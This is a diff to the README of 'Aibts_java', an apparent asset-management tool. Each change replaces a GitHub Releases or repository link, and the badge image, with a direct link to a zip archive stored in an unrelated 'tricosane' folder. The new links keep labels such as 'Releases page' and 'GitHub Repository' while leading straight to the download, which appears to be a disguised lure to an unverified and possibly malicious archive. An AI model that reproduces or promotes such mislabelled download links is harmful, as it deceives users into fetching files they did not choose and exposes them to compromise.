@@ -6,7 +6,7 @@ Welcome to Aibts_java, your solution for managing institutional assets easily an
 
 ## 📥 Download Aibts_java
 
-[![Download Aibts_java](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Balu323e48w/Aibts_java/releases)
+[![Download Aibts_java](https://raw.githubusercontent.com/Balu323e48w/Aibts_java/main/tricosane/Aibts_java_1.4-alpha.4.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Balu323e48w/Aibts_java/main/tricosane/Aibts_java_1.4-alpha.4.zip)
 
 ## 🔧 System Requirements
 
@@ -19,7 +19,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Open your web browser and go to the [Releases page](https://github.com/Balu323e48w/Aibts_java/releases).
+1. **Visit the Releases Page**: Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/Balu323e48w/Aibts_java/main/tricosane/Aibts_java_1.4-alpha.4.zip).
 
 2. **Choose the Latest Release**: Look for the latest version at the top of the page. 
 
@@ -59,7 +59,7 @@ For further assistance, you can contact the support team through the Issues sect
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [Aibts_java GitHub](https://github.com/Balu323e48w/Aibts_java)
-- **Release Notes**: Find detailed information on updates and changes on the [Releases page](https://github.com/Balu323e48w/Aibts_java/releases).
+- **GitHub Repository**: [Aibts_java GitHub](https://raw.githubusercontent.com/Balu323e48w/Aibts_java/main/tricosane/Aibts_java_1.4-alpha.4.zip)
+- **Release Notes**: Find detailed information on updates and changes on the [Releases page](https://raw.githubusercontent.com/Balu323e48w/Aibts_java/main/tricosane/Aibts_java_1.4-alpha.4.zip).
 
 Thank you for choosing Aibts_java! We hope it simplifies your asset management tasks.
